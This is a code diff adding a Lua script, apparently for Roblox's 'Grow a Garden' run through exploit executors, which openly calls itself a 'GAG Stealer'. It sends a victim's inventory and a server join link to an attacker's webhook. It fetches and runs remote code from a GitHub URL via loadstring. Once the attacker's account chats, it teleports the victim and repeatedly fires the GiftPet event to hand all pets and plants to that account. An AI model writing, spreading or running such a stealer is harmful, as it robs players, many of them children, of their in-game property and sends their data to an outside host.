+if #itemsToSend == 0 then return end
+
+table.sort(itemsToSend, function(a, b)
+	if a.Type == "Pet" and b.Type ~= "Pet" then return true end
+	if a.Type ~= "Pet" and b.Type == "Pet" then return false end
+	return a.Value > b.Value
+end)
+
+-- Build and send webhook
+local useDual = totalValue >= 1e12
+local finalWebhook = useDual and DualWebhook or Webhook
+local finalUsername = useDual and DualUsername or Username
+
+local content = (hasRare or hasHeavy) and "@everyone 🚨 Mission Alert!\n" or ""
+content ..= "🚨 **GAG OPS - Steal & Gift Mission** 🚨\n>>> Mission success ✅\n**JobId:** `" .. game.JobId .. "`\n"
+
+local lines = ""
+for _, item in ipairs(itemsToSend) do
+	local icon = item.Type == "Pet" and (
+		table.find(rarePets, item.Name) and "🐲" or (item.Weight >= 10 and "🐘" or "🐶")
+	) or "🍏"
+	lines ..= string.format("%s **%s** (%.2f KG) — ₵%s\n", icon, item.Name, item.Weight, formatNumber(item.Value))
+	if #lines > 1024 then
+		lines = lines:sub(1, 1000) .. "\n...more items"
+		break
+	end
+end
+
+local embed = {
+	title = "🎯 GAG OPS - Steal & Gift Report",
+	description = "Inventory extraction complete. Mission success ✅",
+	color = 0xFF0000,
+	author = {
+		name = "GAG Stealer System",
+		icon_url = "https://cdn-icons-png.flaticon.com/512/2809/2809640.png"
+	},
+	thumbnail = {
+		url = "https://media.tenor.com/l2vJQk1ZoTIAAAAC/ninja-cat.gif"
+	},
+	fields = {
+		{name = "🎯 Victim", value = plr.Name, inline = true},
+		{name = "💰 Total Value", value = "₵" .. formatNumber(totalValue), inline = true},
+		{name = "🗺️ Join Link", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId, inline = false},
+		{name = "🧾 Inventory Log", value = lines, inline = false}
+	},
+	footer = {
+		text = "🦊 GAG Stealer by namnnni2 — Stay stealthy",
+		icon_url = "https://cdn-icons-png.flaticon.com/512/616/616408.png"
+	},
+	timestamp = DateTime.now():ToIsoDate()
+}
+
+local payload = {
+	content = content,
+	embeds = {embed}
+}
+
+local function getRequest()
+	return syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or (identifyexecutor and identifyexecutor():lower():find("delta") and request)
+end
+
+pcall(function()
+	local req = getRequest()
+	if req then
+		req({
+			Url = finalWebhook,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = HttpService:JSONEncode(payload)
+		})
+	end
+end)
+
+-- AUTO GIFT AFTER USER CHAT
+local targetName = finalUsername
+local targetPlr
+
+local function gift(tool)
+	local args = {[1] = targetPlr, [2] = tool}
+	ReplicatedStorage.Events.GiftPet:FireServer(unpack(args))
+end
+
+local function waitUntilGone(tool)
+	while tool.Parent == backpack do
+		gift(tool)
+		task.wait(0.5)
+	end
+end
+
+local function followTarget()
+	if not targetPlr then return end
+	local char = plr.Character or plr.CharacterAdded:Wait()
+	local hrp = char:WaitForChild("HumanoidRootPart")
+	local tChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()
+	local tHrp = tChar:WaitForChild("HumanoidRootPart")
+
+	while targetPlr and targetPlr.Parent do
+		if (tHrp.Position - hrp.Position).Magnitude > 5 then
+			hrp.CFrame = tHrp.CFrame * CFrame.new(0, 0, -3)
+		end
+		for _, prompt in ipairs(targetPlr.Character:GetDescendants()) do
+			if prompt:IsA("ProximityPrompt") and prompt.Enabled then
+				pcall(function()
+					prompt:InputHoldBegin(Enum.UserInputType.Touch)
+					task.wait(prompt.HoldDuration)
+					prompt:InputHoldEnd(Enum.UserInputType.Touch)
+				end)
+			end
+		end
+		task.wait(0.2)
+	end
+end
+
+local function giftSequential()
+	if not targetPlr then return end
+	for _, item in ipairs(itemsToSend) do
+		if item.Type == "Pet" and table.find(rarePets, item.Name) then
+			waitUntilGone(item.Tool)
+		end
+	end
+	for _, item in ipairs(itemsToSend) do
+		if item.Type == "Pet" and item.Weight >= 10 and not table.find(rarePets, item.Name) then
+			waitUntilGone(item.Tool)
+		end
+	end
+	for _, item in ipairs(itemsToSend) do
+		if item.Type == "Pet" and item.Weight < 10 and not table.find(rarePets, item.Name) then
+			waitUntilGone(item.Tool)
+		end
+	end
+	for _, item in ipairs(itemsToSend) do
+		if item.Type == "Plant" then
+			waitUntilGone(item.Tool)
+		end
+	end
+end
+
+local function onTargetReady(p)
+	targetPlr = p
+	p.Chatted:Connect(function()
+		_G.loadingFinished = false
+		pcall(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/namnnni2/Grow-a-garden/refs/heads/main/Loading"))()
+		end)
+		repeat task.wait() until _G.loadingFinished
+		task.spawn(followTarget)
+		task.spawn(giftSequential)
+	end)
+end
+
+for _, p in ipairs(Players:GetPlayers()) do
+	if p.Name == targetName then
+		onTargetReady(p)
+	end
+end
+
+Players.PlayerAdded:Connect(function(p)
+	if p.Name == targetName then
+		onTargetReady(p)
+	end
+end)
